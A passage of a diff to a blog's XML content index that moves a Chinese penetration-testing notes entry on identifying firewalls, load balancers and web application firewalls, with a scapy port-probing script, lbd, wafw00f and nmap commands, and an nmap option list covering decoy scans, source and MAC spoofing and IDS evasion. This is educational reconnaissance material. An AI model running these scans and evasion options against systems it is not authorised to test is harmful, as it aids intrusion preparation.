扫描指定频率以上的端口</code></pre><p><strong>服务版本识别</strong></p><pre><code>-sV                             开放版本探测,可以直接使用-A同时打开操作系统探测和版本探测--version-intensity &quot;level&quot;     设置版本扫描强度,强度水平说明了应该使用哪些探测报文。数值越高，服务越有可能被正确识别。默认是7--version-light                 打开轻量级模式,为--version-intensity 2的别名--version-all                   尝试所有探测,为--version-intensity 9的别名--version-trace                 显示出详细的版本侦测过程信息</code></pre><p><strong>脚本扫描</strong></p><pre><code>-sC　　根据端口识别的服务,调用默认脚本--script=”Lua scripts”　　调用的脚本名--script-args=n1=v1,[n2=v2]　　调用的脚本传递的参数--script-args-file=filename　　使用文本传递参数--script-trace　　显示所有发送和接收到的数据--script-updatedb　　更新脚本的数据库--script-help=”Lua script”　　显示指定脚本的帮助</code></pre><p><strong>OS识别</strong></p><pre><code>-O              启用操作系统检测,-A来同时启用操作系统检测和版本检测--osscan-limit 　　 针对指定的目标进行操作系统检测(至少需确知该主机分别有一个open和closed的端口)--osscan-guess  　　推测操作系统检测结果,当Nmap无法确定所检测的操作系统时，会尽可能地提供最相近的匹配，Nmap默认进行这种匹配</code></pre><p><strong>防火墙/IDS躲避和哄骗</strong></p><pre><code>-f; --mtu value                 指定使用分片、指定数据包的MTU.-D decoy1,decoy2,ME             使用诱饵隐蔽扫描-S IP-ADDRESS                   源地址欺骗-e interface                    使用指定的接口-g/ --source-port PROTNUM       使用指定源端口--proxies url1,[url2],...       使用HTTP或者SOCKS4的代理--data-length NUM               填充随机数据让数据包长度达到NUM--ip-options OPTIONS            使用指定的IP选项来发送数据包--ttl VALUE                     设置IP time-to-live域--spoof-mac ADDR/PREFIX/VEBDOR  MAC地址伪装--badsum                        使用错误的checksum来发送数据包</code></pre><p><strong>Nmap 输出</strong></p><pre><code>-oN                     将标准输出直接写入指定的文件-oX                     输出xml文件-oS                     将所有的输出都改为大写-oG                     输出便于通过bash或者perl处理的格式,非xml-oA BASENAME            可将扫描结果以标准格式、XML格式和Grep格式一次性输出-v                      提高输出信息的详细度-d level                设置debug级别,最高是9--reason                显示端口处于带确认状态的原因--open                  只输出端口状态为open的端口--packet-trace          显示所有发送或者接收到的数据包--iflist                显示路由信息和接口,便于调试--log-errors            把日志等级为errors/warings的日志输出--append-output         追加到指定的文件--resume FILENAME       恢复已停止的扫描--stylesheet PATH/URL   设置XSL样式表，转换XML输出--webxml                从namp.org得到XML的样式--no-sytlesheet         忽略XML声明的XSL样式表</code></pre><p><strong>时间性能优化</strong></p><pre><code>-T 　　时间优化(0-5)(paranoid|sneaky|polite|normal|aggressive|insane)-F　　快速扫描。--max-retries　　调整重传次数。--min-hostgroup/--max-hostgroup size 　　设置组的大小--min-parallelism/--max-parellelism time　　指定时间内的探针数--min-rtt-timrout/--max-rtt-timrout/initial-rtt-timrouttime 　　指定探针超时--scan-delay/-max-scan-delay time 　　指定探针之间的时延--max-retries tries　　指定探针重传转发数--host-timeout time　　设置扫描主机的最大时间--defeat-rst-ratelimit　　设置rst的限制</code></pre><p><strong>其他nmap选项</strong></p><pre><code>-6                      开启IPv6-A                      OS识别,版本探测,脚本扫描和traceroute--datedir DIRNAME       说明用户Nmap数据文件位置--send-eth / --send-ip  使用原以太网帧发送/在原IP层发送--privileged            假定用户具有全部权限--unprovoleged          假定用户不具有全部权限,创建原始套接字需要root权限-V                      打印版本信息-h                      输出帮助</code></pre>]]></content>
-      
-      
-      <categories>
-          
-          <category> 渗透测试 </category>
-          
-          <category> 信息收集 </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> python </tag>
-            
-            <tag> nmap </tag>
-            
-            <tag> lbd </tag>
-            
-            <tag> WAF </tag>
-            
-            <tag> wafw00f </tag>
-            
-            <tag> 负载均衡 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>SMB扫描及SMTP扫描</title>
       <link href="/2013/03/23/Information_Gethering/SMB%E6%89%AB%E6%8F%8F%E5%8F%8ASMTP%E6%89%AB%E6%8F%8F/"/>
       <url>/2013/03/23/Information_Gethering/SMB%E6%89%AB%E6%8F%8F%E5%8F%8ASMTP%E6%89%AB%E6%8F%8F/</url>
@@ -2134,6 +2200,43 @@
     
     
     <entry>
+      <title>WAF扫描识别及负载均衡识别</title>
+      <link href="/2013/03/23/Information_Gethering/WAF%E6%89%AB%E6%8F%8F%E8%AF%86%E5%88%AB%E5%8F%8A%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E8%AF%86%E5%88%AB/"/>
+      <url>/2013/03/23/Information_Gethering/WAF%E6%89%AB%E6%8F%8F%E8%AF%86%E5%88%AB%E5%8F%8A%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E8%AF%86%E5%88%AB/</url>
+      
+        <content type="html"><![CDATA[<blockquote><h3 id="防火墙识别"><a href="#防火墙识别" class="headerlink" title="防火墙识别"></a><strong>防火墙识别</strong></h3><p>通过检查回包,可能识别端口是否经过防火墙过滤<br>设备多种多样,结果存在一定误差</p></blockquote><table><thead><tr><th align="center">No.</th><th align="center">Send</th><th align="center">Response</th><th align="left">Type</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">syn</td><td align="center">No</td><td align="left">Filtered</td></tr><tr><td align="center">1</td><td align="center">ack</td><td align="center">rst</td><td align="left">Filtered</td></tr><tr><td align="center">2</td><td align="center">syn</td><td align="center">syn+ack/syn+rst</td><td align="left">Filtered</td></tr><tr><td align="center">2</td><td align="center">ack</td><td align="center">No</td><td align="left">Filtered</td></tr><tr><td align="center">3</td><td align="center">syn</td><td align="center">syn+ack/syn+rst</td><td align="left">Unfiltered/Open</td></tr><tr><td align="center">3</td><td align="center">ack</td><td align="center">rst</td><td align="left">Unfiltered/Open</td></tr><tr><td align="center">4</td><td align="center">syn</td><td align="center">No</td><td align="left">Closed</td></tr><tr><td align="center">4</td><td align="center">ack</td><td align="center">No</td><td align="left">Closed</td></tr></tbody></table><h4 id="python–scapy-firewall-detect-py-1-1-1-1-443"><a href="#python–scapy-firewall-detect-py-1-1-1-1-443" class="headerlink" title="python–scapy ./firewall_detect.py 1.1.1.1 443"></a><strong>python–scapy</strong> <code>./firewall_detect.py 1.1.1.1 443</code></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line">logging.getLogger(<span class="string">"scapy.runtime"</span>).setLevel(logging.ERROR)</span><br><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv)!=<span class="number">3</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Usage - ./firewall_detect.py [Target IP] [Target Port]"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Example - ./firewall_detect.py 1.1.1.1 443"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Example will determine if filtering exists on port 443 of host 10.0.0.5"</span></span><br><span class="line">sys.exit()</span><br><span class="line"></span><br><span class="line">ip=sys.argv[<span class="number">1</span>]</span><br><span class="line">port=int(sys.argv[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">ACK_response=sr1(IP(dst=ip)/TCP(dport=port,flags=<span class="string">'A'</span>),timeout=<span class="number">1</span>,verbose=<span class="number">0</span>)</span><br><span class="line">SYN_response=sr1(IP(dst=ip)/TCP(dport=port,flags=<span class="string">"S"</span>),timeout=<span class="number">1</span>,verbose=<span class="number">0</span>)</span><br><span class="line"><span class="keyword">if</span> (ACK_response==<span class="literal">None</span>) <span class="keyword">and</span> (SYN_response==<span class="literal">None</span>):</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Port is either unstatefully filtered or host is down"</span></span><br><span class="line"><span class="keyword">elif</span> ((ACK_response==<span class="literal">None</span>) <span class="keyword">or</span> (SYN_response==<span class="literal">None</span>)) <span class="keyword">and</span> <span class="keyword">not</span> ((ACK_response==<span class="literal">None</span>) <span class="keyword">and</span> (SYN_response==<span class="literal">None</span>)):</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Stateful filtering in place"</span></span><br><span class="line"><span class="keyword">elif</span> int(SYN_response[TCP].flags)==<span class="number">18</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Port is unfiltered and open"</span></span><br><span class="line"><span class="keyword">elif</span> int(SYN_response[TCP].flags)==<span class="number">20</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Port is unfiltered and closed"</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Unable to determine if the port is filtered"</span></span><br></pre></td></tr></table></figure><h4 id="Nmap有系列防火墙过滤检测功能"><a href="#Nmap有系列防火墙过滤检测功能" class="headerlink" title="Nmap有系列防火墙过滤检测功能"></a><strong>Nmap</strong>有系列防火墙过滤检测功能</h4><pre><code>nmap -sA 192.168.254.254 -p 22</code></pre><blockquote><h4 id="负载均衡识别"><a href="#负载均衡识别" class="headerlink" title="负载均衡识别"></a><strong>负载均衡识别</strong></h4><p>广域网负载均衡<br>    DNS轮询<br>    一个域名解析多个A纪录<br>    智能DNS<br>服务器负载均衡<br>HTTP-Loadbalancing<br>    Nginx<br>    Apache</p></blockquote><h4 id="lbd"><a href="#lbd" class="headerlink" title="lbd"></a><strong>lbd</strong></h4><pre><code>lbd www.baidu.comlbd mail.163.com</code></pre><blockquote><h3 id="WAF识别"><a href="#WAF识别" class="headerlink" title="WAF识别"></a><strong>WAF识别</strong></h3></blockquote><h4 id="wafw00f-web应用防火墙识别"><a href="#wafw00f-web应用防火墙识别" class="headerlink" title="wafw00f web应用防火墙识别"></a><strong>wafw00f</strong> web应用防火墙识别</h4><pre><code>wafw00f -lwafw00f http://google.com</code></pre><h3 id="nmap-web应用防火墙识别"><a href="#nmap-web应用防火墙识别" class="headerlink" title="nmap web应用防火墙识别"></a><strong>nmap</strong> web应用防火墙识别</h3><pre><code>nmap google.com --script=http-waf-detect.nse</code></pre><h4 id="nmap所有参数-man-nmap"><a href="#nmap所有参数-man-nmap" class="headerlink" title="nmap所有参数 man nmap"></a><strong>nmap所有参数 man nmap</strong></h4><pre><code>-iL filename                   从文件中读取待检测的目标,文件中的表示方法支持机名,ip,网段-iR hostnum                    随机选取,进行扫描.如果-iR指定为0,则是无休止的扫描--exclude host1[, host2]      从扫描任务中需要排除的主机--exculdefile exclude_file     排除文件中的IP,格式和-iL指定扫描文件的格式相同</code></pre><p><strong>主机发现</strong></p><pre><code>-sL                     仅仅是显示,扫描的IP数目,不会进行任何扫描-sn                     ping扫描,即主机发现-Pn                     不检测主机存活-PS/PA/PU/PY[portlist]  TCP SYN Ping/TCP ACK Ping/UDP Ping发现-PE/PP/PM               使用ICMP echo, timestamp and netmask 请求包发现主机-PO[prococol list]      使用IP协议包探测对方主机是否开启-n/-R                   不对IP进行域名反向解析/为所有的IP都进行域名的反响解析--dns-servers 8.8.8.8     根据DNS服务地址扫描--system-dns            使用系统在DNS扫描--traceroute            路由追踪</code></pre><p><strong>扫描技巧</strong></p><pre><code>-sS/sT/sA/sW/sM                 TCP SYN/TCP connect()/ACK/TCP窗口扫描/TCP Maimon扫描-sU                             UDP扫描-sN/sF/sX                       TCP Null，FIN，and Xmas扫描--scanflags                     自定义TCP包中的flags-sI zombie host[:probeport]     Idlescan-sY/sZ                          SCTP INIT/COOKIE-ECHO 扫描-sO                             使用IP protocol 扫描确定目标机支持的协议类型-b “FTP relay host”             使用FTP bounce scan</code></pre><p><strong>指定端口和扫描顺序</strong></p><pre><code>-p                      特定的端口 -p80,443 或者 -p1-65535-p U:PORT               扫描udp的某个端口, -p U:53-F                      快速扫描模式,比默认的扫描端口还少-r                      不随机扫描端口,默认是随机扫描的--top-ports &quot;number&quot;    扫描开放概率最高的number个端口,出现的概率需要参考nmap-services文件,ubuntu中该文件位于/usr/share/nmap.nmap默认扫前1000个--port-ratio &quot;ratio&quot;    扫描指定频率以上的端口</code></pre><p><strong>服务版本识别</strong></p><pre><code>-sV                             开放版本探测,可以直接使用-A同时打开操作系统探测和版本探测--version-intensity &quot;level&quot;     设置版本扫描强度,强度水平说明了应该使用哪些探测报文。数值越高，服务越有可能被正确识别。默认是7--version-light                 打开轻量级模式,为--version-intensity 2的别名--version-all                   尝试所有探测,为--version-intensity 9的别名--version-trace                 显示出详细的版本侦测过程信息</code></pre><p><strong>脚本扫描</strong></p><pre><code>-sC　　根据端口识别的服务,调用默认脚本--script=”Lua scripts”　　调用的脚本名--script-args=n1=v1,[n2=v2]　　调用的脚本传递的参数--script-args-file=filename　　使用文本传递参数--script-trace　　显示所有发送和接收到的数据--script-updatedb　　更新脚本的数据库--script-help=”Lua script”　　显示指定脚本的帮助</code></pre><p><strong>OS识别</strong></p><pre><code>-O              启用操作系统检测,-A来同时启用操作系统检测和版本检测--osscan-limit 　　 针对指定的目标进行操作系统检测(至少需确知该主机分别有一个open和closed的端口)--osscan-guess  　　推测操作系统检测结果,当Nmap无法确定所检测的操作系统时，会尽可能地提供最相近的匹配，Nmap默认进行这种匹配</code></pre><p><strong>防火墙/IDS躲避和哄骗</strong></p><pre><code>-f; --mtu value                 指定使用分片、指定数据包的MTU.-D decoy1,decoy2,ME             使用诱饵隐蔽扫描-S IP-ADDRESS                   源地址欺骗-e interface                    使用指定的接口-g/ --source-port PROTNUM       使用指定源端口--proxies url1,[url2],...       使用HTTP或者SOCKS4的代理--data-length NUM               填充随机数据让数据包长度达到NUM--ip-options OPTIONS            使用指定的IP选项来发送数据包--ttl VALUE                     设置IP time-to-live域--spoof-mac ADDR/PREFIX/VEBDOR  MAC地址伪装--badsum                        使用错误的checksum来发送数据包</code></pre><p><strong>Nmap 输出</strong></p><pre><code>-oN                     将标准输出直接写入指定的文件-oX                     输出xml文件-oS                     将所有的输出都改为大写-oG                     输出便于通过bash或者perl处理的格式,非xml-oA BASENAME            可将扫描结果以标准格式、XML格式和Grep格式一次性输出-v                      提高输出信息的详细度-d level                设置debug级别,最高是9--reason                显示端口处于带确认状态的原因--open                  只输出端口状态为open的端口--packet-trace          显示所有发送或者接收到的数据包--iflist                显示路由信息和接口,便于调试--log-errors            把日志等级为errors/warings的日志输出--append-output         追加到指定的文件--resume FILENAME       恢复已停止的扫描--stylesheet PATH/URL   设置XSL样式表，转换XML输出--webxml                从namp.org得到XML的样式--no-sytlesheet         忽略XML声明的XSL样式表</code></pre><p><strong>时间性能优化</strong></p><pre><code>-T 　　时间优化(0-5)(paranoid|sneaky|polite|normal|aggressive|insane)-F　　快速扫描。--max-retries　　调整重传次数。--min-hostgroup/--max-hostgroup size 　　设置组的大小--min-parallelism/--max-parellelism time　　指定时间内的探针数--min-rtt-timrout/--max-rtt-timrout/initial-rtt-timrouttime 　　指定探针超时--scan-delay/-max-scan-delay time 　　指定探针之间的时延--max-retries tries　　指定探针重传转发数--host-timeout time　　设置扫描主机的最大时间--defeat-rst-ratelimit　　设置rst的限制</code></pre><p><strong>其他nmap选项</strong></p><pre><code>-6                      开启IPv6-A                      OS识别,版本探测,脚本扫描和traceroute--datedir DIRNAME       说明用户Nmap数据文件位置--send-eth / --send-ip  使用原以太网帧发送/在原IP层发送--privileged            假定用户具有全部权限--unprovoleged          假定用户不具有全部权限,创建原始套接字需要root权限-V                      打印版本信息-h                      输出帮助</code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> 渗透测试 </category>
+          
+          <category> 信息收集 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> python </tag>
+            
+            <tag> nmap </tag>
+            
+            <tag> lbd </tag>
+            
+            <tag> WAF </tag>
+            
+            <tag> wafw00f </tag>
+            
+            <tag> 负载均衡 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>操作系统识别及SNMP扫描</title>
       <link href="/2013/03/22/Information_Gethering/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%89%AB%E6%8F%8F%E8%AF%86%E5%88%AB/"/>
       <url>/2013/03/22/Information_Gethering/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%89%AB%E6%8F%8F%E8%AF%86%E5%88%AB/</url>
@@ -2154,9 +2257,9 @@
             
             <tag> python </tag>
             
-            <tag> SNMP </tag>
-            
             <tag> nmap </tag>
+            
+            <tag> SNMP </tag>
             
             <tag> Scapy </tag>
             
